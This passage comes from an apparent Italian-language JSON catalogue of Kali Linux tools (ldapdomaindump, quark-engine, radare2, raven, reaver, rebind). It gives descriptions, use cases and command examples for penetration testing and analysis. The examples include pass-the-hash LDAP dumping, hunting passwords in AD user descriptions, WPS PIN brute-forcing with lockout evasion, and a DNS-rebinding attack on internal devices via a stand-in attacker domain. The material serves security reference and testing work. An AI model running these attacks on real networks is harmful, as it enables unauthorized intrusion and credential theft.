class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Static Analysis:</strong> pyinstxtractor non esegue mai il codice contenuto nell'eseguibile, rendendo l'analisi sicura. Tuttavia, l'eseguibile stesso potrebbe contenere anti-analysis che si attiva al momento dell'estrazione se eseguito in un sandbox.</p><p><strong>Incomplete Decompilation:</strong> Non tutti i file .pyc sono decompilabili al 100%. Python 3.11+ ha bytecode significativamente diverso che i decompilatori legacy non gestiscono. pycdc ha il supporto più ampio per versioni recenti.</p><p><strong>Obfuscation Layers:</strong> Malware sofisticato può usare obfuscation (PyArmor, Cython, custom) sopra PyInstaller. In questi casi, l'estrazione riesce ma il codice decompilato è offuscato e richiede ulteriore analisi.</p><p><strong>Encrypted Archives:</strong> PyInstaller supporta cifratura dell'archivio con <code>--key</code>. In questo caso la chiave deve essere estratta dall'eseguibile con altri tool (strings, debugger) prima di poter decompilare i moduli.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "python-ldapdomaindump",
    "name": "python-ldapdomaindump",
    "version": "0.9.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/python-ldapdomaindump/",
    "desc": "Dumpa informazioni Active Directory via LDAP: utenti, gruppi, computer, policy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ldapdomaindump</strong> è un tool Python sviluppato da Dirk-jan Mollema (Fox-IT) che esegue un dump completo e strutturato di informazioni Active Directory via protocollo LDAP. A differenza di tool come BloodHound che si concentrano su relazioni di attacco, ldapdomaindump produce un report completo della struttura del dominio: tutti gli utenti (con attributi dettagliati), gruppi e membership, computer, trust tra domini, password policy, e Group Policy Objects. L'output viene generato simultaneamente in tre formati — <strong>HTML</strong> (navigabile via browser con tabelle sortabili), <strong>JSON</strong> (parsabile programmaticamente), e <strong>grep-friendly text</strong> (per ricerche rapide con grep/awk). Questo lo rende ideale per la fase iniziale di domain enumeration, producendo un dataset offline completo consultabile senza ulteriori query al DC.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Complete Domain Dump:</strong> Estrae tutti gli oggetti accessibili via LDAP: utenti (con lastLogon, pwdLastSet, description, adminCount, email), gruppi (con membership ricorsiva), computer (con OS version, lastLogon), trust (tipo, direzione), e GPO. Cattura attributi che spesso contengono informazioni sensibili nelle description degli utenti (password, note).</p><p><strong>Multi-Format Output:</strong> Ogni categoria viene salvata in tre formati simultaneamente. HTML con tabelle interattive per analisi visuale rapida: ordinamento per colonna, ricerca, e highlight di account privilegiati. JSON per parsing automatizzato. Grep-friendly per ricerche da command line.</p><p><strong>Privilege Highlighting:</strong> Identifica e evidenzia automaticamente account con privilegi elevati: Domain Admins, Enterprise Admins, account con adminCount=1, account con delegation trust. Nell'output HTML, questi account sono evidenziati per immediata visibilità.</p><p><strong>Relationship Resolution:</strong> Risolve automaticamente membership dei gruppi (inclusa nested membership), trust tra domini, e relazioni tra oggetti. L'output mostra chi è membro di cosa e quali trust esistono, senza necessità di query aggiuntive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>ldapdomaindump richiede credenziali di dominio (anche utente standard) e raggiungibilità LDAP al DC.</p><pre><code># Dump base con credenziali\nldapdomaindump -u 'CORP\\jsmith' -p 'Password123' dc01.corp.local\n\n# Output in directory specifica\nldapdomaindump -u 'CORP\\jsmith' -p 'Pass123' \\\n  -o ./ad_dump dc01.corp.local\n\n# Con LDAPS (porta 636, crittografato)\nldapdomaindump -u 'jsmith' -p 'Pass123' \\\n  --ssl dc01.corp.local\n\n# Con hash NTLM (pass-the-hash)\nldapdomaindump -u 'CORP\\jsmith' \\\n  -p 'aad3b435b51404eeaad3b435b51404ee:da39a3ee5e6b4b0d3255bfef95601890' \\\n  --authtype NTLM dc01.corp.local\n\n# File generati:\n# domain_computers.html/json/grep\n# domain_computers_by_os.html\n# domain_groups.html/json/grep\n# domain_policy.html/json/grep\n# domain_trusts.html/json/grep\n# domain_users.html/json/grep\n# domain_users_by_group.html\n\n# Analisi offline dei risultati\n# Apri report HTML nel browser\nfirefox ./ad_dump/domain_users.html &amp;\n\n# Cerca password nelle description utenti\ngrep -i 'password\\|pwd\\|pass' domain_users.grep\n\n# Trova account mai loggati (honeypot?)\ngrep 'lastLogon: 0' domain_users.grep\n\n# Account con password che non scadono\ngrep 'DONT_EXPIRE_PASSWORD' domain_users.grep\n\n# Parsing JSON con jq\njq '.[] | select(.adminCount == 1) | .sAMAccountName' \\\n  domain_users.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Initial AD Enumeration</strong>, ldapdomaindump è spesso il primo tool eseguito dopo aver ottenuto credenziali di dominio. Produce un dataset completo consultabile offline, riducendo le query successive al DC e il rischio di detection.</p><p>Per <strong>Attack Surface Mapping</strong>, il dump rivela: account con password nelle description, account di servizio con SPN (Kerberoastable), computer con OS obsoleti, trust exploitabili, e policy di password deboli. Ogni elemento è un potenziale vettore di attacco.</p><p>Per <strong>Reporting e Documentazione</strong>, l'output HTML è direttamente includibile nei report di penetration test. Le tabelle forniscono una vista chiara della struttura AD che facilita la comunicazione con il cliente.</p><p>Per <strong>Offline Analysis</strong>, il dataset completo permette analisi approfondite senza connessione al dominio. Utile quando l'accesso è limitato nel tempo o quando si vuole analizzare il dominio con calma dopo l'engagement attivo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>LDAP Query Logging:</strong> Il dump genera centinaia di query LDAP loggate sul domain controller (Event ID 1644 se enabled). Il volume e il pattern delle query sono distinguibili da attività LDAP normale.</p><p><strong>Large Data Transfer:</strong> Un dominio con migliaia di oggetti genera un volume significativo di traffico LDAP. Questo può essere rilevato da network monitoring, specialmente se eseguito da una workstation che normalmente non effettua query LDAP massive.</p><p><strong>Credential Requirement:</strong> Richiede credenziali di dominio valide. Anche un utente standard ha accesso in lettura alla maggior parte degli oggetti AD di default. L'account usato appare nei log di autenticazione LDAP.</p><p><strong>Alternative Stealth:</strong> Per operazioni più discrete, considerare query LDAP mirate (solo attributi specifici) invece di un dump completo. Tool come ldapsearch con filtri specifici generano meno rumore.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "LDAP_AD"
    ],
    "notes": null
  },
  {
    "id": "quark-engine",
    "name": "quark-engine",
    "version": "23.9.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/quark-engine/",
    "desc": "Analisi statica APK Android per rilevamento malware tramite regole comportamentali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Quark-Engine</strong> è un sistema di analisi malware Android basato su regole comportamentali, sviluppato per fornire un approccio strutturato al rilevamento di comportamenti malevoli nelle applicazioni APK. A differenza degli antivirus tradizionali che si basano su signature statiche (hash, pattern di byte), Quark analizza il comportamento dell'applicazione identificando combinazioni di API call che, insieme, indicano attività sospetta. Ad esempio, un'app che accede ai contatti (API: getContactList) e poi invia dati via HTTP (API: openConnection) presenta un pattern di esfiltrazione dati. Quark valuta centinaia di questi pattern assegnando un punteggio di rischio composito. Il sistema è ispirato alla filosofia \"le azioni parlano più delle parole\": non cerca codice malevolo specifico, ma pattern comportamentali che indicano intento malevolo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Five-Stage Behavioral Analysis:</strong> Ogni regola viene valutata in 5 stadi progressivi: 1) l'API target esiste nel APK, 2) l'API viene effettivamente chiamata, 3) le API sono nel flusso di esecuzione corretto, 4) le API operano sugli stessi dati, 5) il comportamento è confermato dall'analisi del call graph. Ogni stadio aumenta la confidenza del rilevamento.</p><p><strong>Extensive Rule Library:</strong> Oltre 200 regole predefinite che coprono le principali categorie di malware Android: spyware (intercettazione SMS, registrazione chiamate, accesso camera/microfono), ransomware (cifratura file, blocco schermo), banking trojan (overlay attack, keylogging), adware (click fraud, notification abuse). Regole custom facilmente creabili in formato JSON.</p><p><strong>Risk Scoring:</strong> Ogni comportamento rilevato contribuisce a un punteggio di rischio composito. I comportamenti più pericolosi (esfiltrazione, cifratura, C2 communication) hanno peso maggiore. Il punteggio finale classifica l'APK da benigno a altamente malevolo.</p><p><strong>Call Graph Generation:</strong> Produce visualizzazione del call graph evidenziando i percorsi di esecuzione che portano ai comportamenti malevoli. Utile per analisti che vogliono comprendere la logica del malware e documentare le catene di chiamata.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Quark-Engine si usa da CLI o come libreria Python per integrazione in pipeline.</p><pre><code># Analisi rapida con summary\nquark -a suspicious.apk -s\n\n# Analisi dettagliata con tutti i comportamenti trovati\nquark -a suspicious.apk -d\n\n# Output in formato JSON per parsing\nquark -a suspicious.apk -o report.json\n\n# Analisi con regole custom\nquark -a suspicious.apk -r ./custom_rules/\n\n# Genera call graph per comportamento specifico\nquark -a suspicious.apk -g\n\n# Come libreria Python per integrazione\nfrom quark.report import Report\nreport = Report()\nreport.analysis('suspicious.apk', '/path/to/rules/')\nfor rule in report.get_report():\n    print(f\"Rule: {rule['crime']}\")\n    print(f\"Confidence: {rule['confidence']}%\")\n    print(f\"Score: {rule['score']}\")\n\n# Batch analysis su directory di APK\nfor apk in *.apk; do\n  echo \"=== Analyzing $apk ===\"\n  quark -a \"$apk\" -s\ndone\n\n# Creazione regola custom (JSON)\n# {\n#   \"crime\": \"Exfiltrate contacts via HTTP\",\n#   \"permission\": [\"android.permission.READ_CONTACTS\",\n#                   \"android.permission.INTERNET\"],\n#   \"api\": [\n#     {\"class\": \"Landroid/content/ContentResolver\",\n#      \"method\": \"query\"},\n#     {\"class\": \"Ljava/net/URL\",\n#      \"method\": \"openConnection\"}\n#   ],\n#   \"score\": 4\n# }</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Triage</strong>, Quark fornisce classificazione rapida di APK sospetti. In ambienti SOC che processano centinaia di campioni al giorno, il punteggio di rischio permette di prioritizzare quali APK richiedono analisi manuale approfondita.</p><p>Per <strong>App Vetting Aziendale</strong>, prima di approvare l'installazione di app su dispositivi corporate (BYOD o managed), Quark verifica l'assenza di comportamenti malevoli. Integrabile in pipeline MDM per screening automatico.</p><p>Per <strong>Threat Research</strong>, l'analisi comportamentale permette di classificare nuove varianti di malware family note. Pattern simili indicano origine comune anche quando le signature cambiano.</p><p>Per <strong>Development Security</strong>, verifica che SDK e librerie di terze parti incluse in app legittime non contengano comportamenti nascosti (spyware SDK, data harvesting).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Static Analysis Only:</strong> Quark analizza il bytecode DEX senza eseguire l'APK, rendendo l'analisi sicura. Non rileva malware che scarica payload a runtime o che usa reflection/dynamic loading per nascondere le API call.</p><p><strong>Evasion Techniques:</strong> Malware sofisticato può evadere Quark tramite: code packing (encrypted DEX), native code (JNI/NDK), dynamic class loading, reflection per chiamare API indirettamente, o obfuscation dei nomi di classe e metodo.</p><p><strong>False Positives:</strong> Comportamenti legittimi possono matchare regole malware. Un'app di messaggistica legittima che accede a contatti e usa internet matcha le stesse regole di uno spyware. Il contesto e il punteggio composito aiutano a distinguere.</p><p><strong>Rule Maintenance:</strong> Nuove tecniche malware richiedono nuove regole. Il database va aggiornato regolarmente. La community contribuisce regole, ma la copertura non è garantita per malware zero-day.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "radare2",
    "name": "radare2",
    "version": "5.9.8",
    "icon": "../app/icons/radare2-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/radare2/",
    "desc": "Framework reverse engineering completo: disassembler, debugger, analisi binaria.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Radare2</strong> (r2) è il framework di reverse engineering open-source più completo e versatile disponibile. A differenza di tool single-purpose, r2 integra in un unico ambiente: disassembler multi-architettura, debugger, analizzatore binario, hex editor, diff tool, e shell scriptabile. Supporta oltre 50 architetture (x86, x64, ARM, MIPS, PowerPC, SPARC, AVR, etc.) e decine di formati file (ELF, PE, Mach-O, DEX, raw, etc.). L'interfaccia command-line, sebbene inizialmente ostica, offre potenza e flessibilità impareggiabili una volta padroneggiata. Il sistema di comandi gerarchico permette di fare praticamente qualsiasi cosa in pochi caratteri. r2pipe estende le capacità permettendo scripting in Python, JavaScript, Go, e altri linguaggi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Universal Architecture Support:</strong> Disassembly nativo per x86/x64, ARM/ARM64, MIPS, PowerPC, SPARC, AVR, 8051, Z80, e molte altre. Aggiungere supporto per nuove architetture è relativamente semplice grazie all'architettura modulare.</p><p><strong>Advanced Analysis Engine:</strong> L'analisi automatica (aaa) identifica funzioni, basic blocks, cross-references, variabili locali, argomenti, e costruisce control flow graph. L'analisi ESIL (Evaluable Strings Intermediate Language) permette emulazione parziale per comprendere valori a runtime.</p><p><strong>Integrated Debugger:</strong> Debugging nativo su Linux, Windows, macOS, e piattaforme embedded via gdb/lldb. Breakpoint, watchpoint, step, continue, memory inspection, register modification. Perfetto per analisi dinamica.</p><p><strong>Extensibility:</strong> r2pipe espone tutte le funzionalità via API, permettendo scripting avanzato. Plugin in C, Python, o Go estendono le capacità. Community attiva produce costantemente nuovi plugin e script.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>R2 usa un sistema di comandi single-letter. La learning curve è ripida ma la potenza è impareggiabile.</p><pre><code># Apertura binario con analisi automatica\nr2 -A ./binary\n# -A equivale a eseguire 'aaa' all'avvio\n\n# === ANALISI ===\naaa          # Analisi completa (funzioni, xrefs, strings, etc.)\nafl          # Lista tutte le funzioni trovate\nafl~main     # Filtra funzioni contenenti 'main'\naxt @sym.main # Cross-references a main (chi chiama main)\naxf @sym.main # Cross-references da main (chi main chiama)\n\n# === DISASSEMBLY ===\npdf @main    # Print disassembly function main\npdf @0x401000 # Disassembly a indirizzo specifico\npd 20        # Print 20 istruzioni da posizione corrente\nVV           # Visual mode - graph view delle funzioni\n\n# === NAVIGAZIONE ===\ns main       # Seek: vai alla funzione main\ns 0x401000   # Seek a indirizzo\ns+ 10        # Avanza di 10 byte\n\n# === INFORMAZIONI ===\nii           # Import table\niS           # Sezioni del binario\niz           # Strings nel binario\nizz          # Strings in tutto il file (anche data sections)\n\n# === DEBUGGING ===\nr2 -d ./binary  # Avvia in debug mode\ndb main      # Set breakpoint su main\ndb 0x401234  # Breakpoint su indirizzo\ndc           # Continue execution\nds           # Step into\ndso          # Step over\ndr           # Show registers\ndm           # Memory maps\n\n# === PATCHING ===\nwa nop @0x401234  # Write assembly: NOP a indirizzo\nwx 90909090 @addr # Write hex bytes\n\n# === SCRIPTING con r2pipe ===\n# Python example:\nimport r2pipe\nr2 = r2pipe.open('./binary')\nr2.cmd('aaa')\nfunctions = r2.cmdj('aflj')  # Output JSON\n\n# One-liner per batch analysis\nr2 -q -c 'aaa; afl; q' binary</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Analysis</strong>, r2 fornisce ambiente completo per analisi statica e dinamica. Il disassembler identifica funzioni interessanti, il debugger permette di osservare comportamento runtime in ambiente controllato.</p><p>Durante <strong>CTF Competitions</strong>, r2 è lo strumento preferito per challenge di reverse engineering. La velocità di navigazione e analisi lo rende ideale per competizioni con tempo limitato.</p><p>Nella <strong>Vulnerability Research</strong>, analisi di binari per identificare vulnerabilità: buffer overflow, format string, use-after-free. L'emulazione ESIL aiuta a tracciare data flow senza eseguire il binario.</p><p>Per <strong>Firmware Analysis</strong>, il supporto per architetture embedded (ARM, MIPS) e formati raw lo rende ideale per analizzare firmware di router, IoT, e dispositivi embedded.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Learning Curve:</strong> L'interfaccia CLI è potente ma richiede investimento significativo per padroneggiare. Il sistema di comandi non è intuitivo inizialmente. Documentazione disponibile con '?' dopo ogni comando.</p><p><strong>GUI Alternative:</strong> Cutter (https://cutter.re/) fornisce interfaccia grafica basata su r2. Ideale per chi preferisce GUI senza rinunciare al backend r2.</p><p><strong>Comparison:</strong> Per puro decompilation, Ghidra offre output più leggibile. r2 eccelle in scriptability, debugging, e supporto architetture. Idealmente, usare entrambi in combinazione.</p><p><strong>Resource Usage:</strong> Analisi completa di binari grandi può richiedere tempo e memoria significativi. Usare 'aa' invece di 'aaa' per analisi più veloce ma meno completa.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "raven",
    "name": "raven",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/raven/",
    "desc": "Pipelines scanner per GitHub Actions e CI/CD security con detection di poisoning.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Raven</strong> è uno scanner di sicurezza specializzato nell'analisi di pipeline CI/CD, con focus primario su GitHub Actions. Identifica vulnerabilità che possono portare a supply chain attacks, una delle minacce più critiche nel software development moderno. Raven analizza i workflow YAML cercando: pipeline poisoning (possibilità per attaccanti di iniettare codice malevolo nel build), injection vulnerabilities (uso non sanitizzato di input controllabili), secrets exposure (leak di credenziali), permission escalation, e misconfigurazioni che violano il principio del least privilege. Essenziale per DevSecOps e per red team che vogliono identificare vettori di attacco attraverso CI/CD.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>GitHub Actions Deep Analysis:</strong> Parser specializzato per workflow YAML che comprende la semantica di GitHub Actions: triggers, jobs, steps, expressions, contexts. Identifica pattern pericolosi specifici di questa piattaforma.</p><p><strong>Pipeline Poisoning Detection:</strong> Rileva scenari dove un attaccante potrebbe modificare il codice eseguito dalla pipeline: pull_request_target mal configurato, workflow_run abuse, checkout di PR non trusted, script injection via branch names.</p><p><strong>Secrets and Credentials Audit:</strong> Identifica secrets esposti o mal gestiti: hardcoded credentials, secrets passati a step non necessari, output di secrets in log, secrets accessibili da fork.</p><p><strong>Injection Vulnerability Detection:</strong> Trova possibilità di code injection attraverso GitHub contexts (${{ }}) non sanitizzati: titoli PR, body di issue, branch names usati in comandi shell.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Raven supporta scan di singoli repository o intere organizzazioni GitHub.</p><pre><code># Scan singolo repository pubblico\nraven scan --repo https://github.com/org/vulnerable-repo\n\n# Scan con output JSON per integrazione\nraven scan --repo https://github.com/org/repo --output report.json\n\n# Scan intera organizzazione GitHub\nraven scan --org organization_name --token ghp_xxxxx\n\n# Scan repository privato (richiede token)\nraven scan --repo https://github.com/private/repo --token ghp_xxxxx\n\n# Scan locale di workflow files\nraven scan --path /path/to/.github/workflows/\n\n# Output dettagliato con remediation\nraven scan --repo url --verbose\n\n# Esempio output vulnerabilità:\n# [HIGH] Potential Script Injection in workflow ci.yml\n#   Step: 'Run tests' uses unsanitized ${{ github.event.pull_request.title }}\n#   Impact: Attacker can execute arbitrary commands via PR title\n#   Remediation: Use environment variable instead of direct interpolation\n\n# Scan con filtro severity\nraven scan --repo url --min-severity high\n\n# Export per CI/CD integration (exit code non-zero se trovate vulnerabilità)\nraven scan --repo url --fail-on high</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Supply Chain Security Audit</strong>, Raven identifica come un attaccante potrebbe compromettere la build pipeline per iniettare codice malevolo in artifact distribuiti. Un singolo workflow vulnerabile può compromettere tutti i downstream consumers.</p><p>In <strong>DevSecOps Integration</strong>, Raven può essere integrato nella CI/CD stessa per scansionare i workflow ad ogni PR. Previene l'introduzione di nuove vulnerabilità prima che raggiungano main branch.</p><p>Durante <strong>Red Team Engagements</strong>, dopo aver ottenuto accesso a un repository (anche solo fork pubblico), Raven identifica come escalare l'accesso sfruttando vulnerabilità CI/CD per eseguire codice con secrets dell'organizzazione.</p><p>Per <strong>Dependency Security</strong>, analizza non solo i workflow del repo target ma anche actions third-party utilizzate, identificando rischi da dependencies non trusted o versioni pinned in modo insicuro.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Rate Limits:</strong> Scan di organizzazioni grandi o multiple repositories richiede GitHub token per evitare rate limiting. Token con scope 'repo' per repository privati.</p><p><strong>Public Repository Legality:</strong> Scan di repository pubblici è completamente legale e non richiede autorizzazione. Le informazioni sui workflow sono pubblicamente accessibili.</p><p><strong>Private Repository Authorization:</strong> Per repository privati, è necessaria autorizzazione esplicita dall'owner. Il token deve avere accesso al repository target.</p><p><strong>Responsible Disclosure:</strong> Se si trovano vulnerabilità in progetti open-source, seguire responsible disclosure practices. Molti progetti hanno security policy documentate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Git_Recon"
    ],
    "notes": null
  },
  {
    "id": "reaver",
    "name": "reaver",
    "version": "1.6.6",
    "icon": "../app/icons/reaver-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/reaver/",
    "desc": "Brute force WPS PIN per ottenere password WPA/WPA2 su access point vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Reaver</strong> è il tool di riferimento per attacchi contro WPS (WiFi Protected Setup), un protocollo che permette di connettersi a reti WPA/WPA2 usando un PIN di 8 cifre invece della password. La debolezza fondamentale di WPS è che il PIN viene validato in due metà separate: prima i primi 4 digit, poi i secondi 3 (l'ottavo è checksum). Questo riduce lo spazio di ricerca da 10^8 (100 milioni) a 10^4 + 10^3 = 11.000 tentativi massimi. Reaver automatizza il brute force di tutti i possibili PIN, tipicamente completando l'attacco in 4-10 ore. L'integrazione con Pixie Dust (pixiewps) permette di crackare istantaneamente router con implementazioni WPS vulnerabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WPS PIN Brute Force:</strong> Enumera sistematicamente tutti i PIN possibili inviando M4/M6 message e analizzando le risposte. L'algoritmo ottimizzato testa prima la prima metà del PIN, poi la seconda, riducendo drasticamente il tempo.</p><p><strong>Pixie Dust Attack:</strong> Integrazione con pixiewps per sfruttare implementazioni WPS con PRNG debole. Se il router è vulnerabile, il PIN viene recuperato in secondi analizzando i nonce scambiati durante l'handshake, senza necessità di brute force.</p><p><strong>Rate Limiting Evasion:</strong> Molti router implementano lockout dopo troppi tentativi falliti. Reaver include delay configurabili, rilevamento di lockout, e strategie per aggirare o attendere il reset del contatore.</p><p><strong>Session Persistence:</strong> Salva automaticamente lo stato dell'attacco permettendo di riprendere da dove si era interrotti. Essenziale per attacchi lunghi che potrebbero essere interrotti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Reaver richiede interfaccia wireless in monitor mode e BSSID del target.</p><pre><code># PREREQUISITI\n# 1. Identificare interfaccia wireless\niwconfig\n\n# 2. Attivare monitor mode\nairmon-ng check kill   # Uccide processi che interferiscono\nairmon-ng start wlan0  # Crea wlan0mon\n\n# 3. Identificare target con WPS abilitato\nwash -i wlan0mon\n# Output: BSSID, Channel, WPS Locked status\n\n# ATTACCO STANDARD\n# Brute force WPS PIN\nreaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv\n# -c: canale (ottimizza performance)\n# -vv: verbose output\n\n# PIXIE DUST (molto più veloce se vulnerabile)\nreaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv\n# -K 1: abilita Pixie Dust attack\n# Se vulnerabile, PIN recuperato in secondi\n\n# EVASIONE RATE LIMITING\n# Con delay tra tentativi\nreaver -i wlan0mon -b BSSID -d 5 -vv\n# -d 5: 5 secondi di delay\n\n# Riprendi sessione precedente\nreaver -i wlan0mon -b BSSID -vv\n# Reaver riprende automaticamente dall'ultimo PIN\n\n# Forzare stato specifico\nreaver -i wlan0mon -b BSSID -p 1234 -vv\n# -p: inizia da PIN specifico (prima metà)\n\n# OPZIONI AVANZATE\n# Timeout e retry\nreaver -i wlan0mon -b BSSID -t 5 -T 1 -vv\n# -t: receive timeout\n# -T: M5/M7 timeout\n\n# Output tipico con successo:\n# [+] WPS PIN: '12345670'\n# [+] WPA PSK: 'PasswordDellaRete'\n# [+] AP SSID: 'NomeRete'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>WiFi Penetration Testing</strong>, Reaver è il metodo primario per attaccare reti con WPS abilitato. Anche con password WPA2 complesse, un PIN WPS debole compromette l'intera rete.</p><p>Per <strong>Security Audit Aziendale</strong>, verifica che WPS sia disabilitato su tutti gli access point dell'infrastruttura. WPS dovrebbe essere disabilitato by default su qualsiasi rete enterprise.</p><p>Durante <strong>Red Team Physical Assessment</strong>, accesso WiFi è spesso il primo passo per infiltrazione nella rete interna. Reaver può fornire accesso dove altri attacchi (dictionary, deauth/capture) falliscono.</p><p>In <strong>Home Network Security</strong>, per verificare che il proprio router non sia vulnerabile. Molti router consumer hanno ancora WPS abilitato di default.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità Critica:</strong> Attaccare reti WiFi senza autorizzazione è reato penale in tutte le giurisdizioni. Anche solo il tentativo, senza successo, può costituire reato. Utilizzare ESCLUSIVAMENTE su reti di proprietà o con autorizzazione scritta esplicita.</p><p><strong>Tempo di Attacco:</strong> Brute force completo richiede 4-10 ore dipendendo dal router. Pixie Dust riduce a secondi se vulnerabile. Session resume permette di interrompere e riprendere.</p><p><strong>WPS Lockout:</strong> Router moderni bloccano WPS dopo 3-10 tentativi falliti, rendendo l'attacco impraticabile. Il lockout può durare da minuti a permanente (fino a reboot). Verificare prima con wash se WPS è in stato \"Locked\".</p><p><strong>Detection:</strong> L'attacco genera traffico anomalo rilevabile da WIDS enterprise. Pattern di authentication frame ripetuti a singolo BSSID è signature nota.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "rebind",
    "name": "rebind",
    "version": "0.3.4",
    "icon": "../app/icons/rebind-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rebind/",
    "desc": "DNS rebinding attack tool per bypass same-origin policy e accesso a servizi interni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Rebind</strong> è un tool per eseguire attacchi DNS rebinding, una tecnica sofisticata per bypassare la Same-Origin Policy (SOP) dei browser web. La SOP normalmente impedisce a JavaScript di un dominio di accedere a risorse di un altro dominio. DNS rebinding aggira questa protezione manipolando le risposte DNS: inizialmente il dominio dell'attaccante risolve all'IP del server malevolo (per caricare il JavaScript), poi il TTL scade e una successiva query risolve all'IP di un servizio interno della vittima (192.168.x.x, 10.x.x.x, localhost). Il browser, credendo di comunicare con lo stesso dominio (origin), permette al JavaScript di accedere al servizio interno come se fosse autorizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Malicious DNS Server:</strong> Server DNS integrato che risponde con TTL estremamente basso (tipicamente 0 o 1 secondo). La prima risposta punta al web server dell'attaccante, le successive all'IP interno target specificato.</p><p><strong>Payload Web Server:</strong> Serve pagine HTML con JavaScript che implementa la logica di rebinding: attende la scadenza del TTL, poi effettua richieste HTTP al \"proprio\" dominio che ora risolve all'IP interno.</p><p><strong>Internal Service Access:</strong> Permette al JavaScript nel browser della vittima di interagire con servizi interni: leggere risposte HTTP, inviare POST request, potenzialmente esfiltrare dati o modificare configurazioni.</p><p><strong>Target Configuration:</strong> IP e porta del target interno sono configurabili. Può attaccare router (192.168.1.1), server interni, IoT devices, o qualsiasi servizio raggiungibile dalla rete della vittima.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'attacco richiede che la vittima visiti un dominio controllato dall'attaccante.</p><pre><code># Setup prerequisiti:\n# 1. Dominio con NS record che punta al tuo server\n# 2. Server con IP pubblico per DNS e web server\n\n# Avvio server rebind\nrebind --domain evil.attacker.com --target 192.168.1.1 --port 80\n# --domain: dominio controllato dall'attaccante\n# --target: IP interno da attaccare\n# --port: porta del servizio interno\n\n# Flow dell'attacco:\n# 1. Vittima visita http://rebind.evil.attacker.com\n# 2. DNS risolve all'IP dell'attacker (prima risposta)\n# 3. Browser carica pagina con JavaScript malevolo\n# 4. JavaScript attende TTL expiration\n# 5. JavaScript fa richiesta a rebind.evil.attacker.com\n# 6. DNS ora risolve a 192.168.1.1 (seconda risposta)\n# 7. Browser pensa sia stesso origin, permette la richiesta\n# 8. JavaScript accede al router interno!\n\n# Configurazione avanzata\nrebind --domain evil.com --target 127.0.0.1 --port 8080\n# Attacco a servizi localhost della vittima\n\n# Con porta web server custom\nrebind --domain evil.com --target 10.0.0.50 --port 22 --webport 8888</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Router Exploitation</strong>, l'attacco classico è contro pannelli admin di router domestici. La vittima visita un sito malevolo, e il JavaScript accede a http://192.168.1.1 per modificare configurazioni DNS, aprire porte, o estrarre credenziali WiFi.</p><p>Per <strong>Internal Network Reconnaissance</strong>, dal browser della vittima si possono scansionare servizi interni, identificare host attivi, e mappare la rete interna attraverso timing delle risposte HTTP.</p><p>In <strong>Red Team Operations</strong>, combinato con phishing, permette di accedere a servizi interni aziendali senza compromettere direttamente la macchina della vittima - solo il browser viene \"abusato\".</p><p>Per <strong>IoT Exploitation</strong>, molti dispositivi IoT hanno web interface senza autenticazione o con credenziali default. DNS rebinding permette di controllarli remotamente attraverso la rete della vittima.</p><br><hr><h4 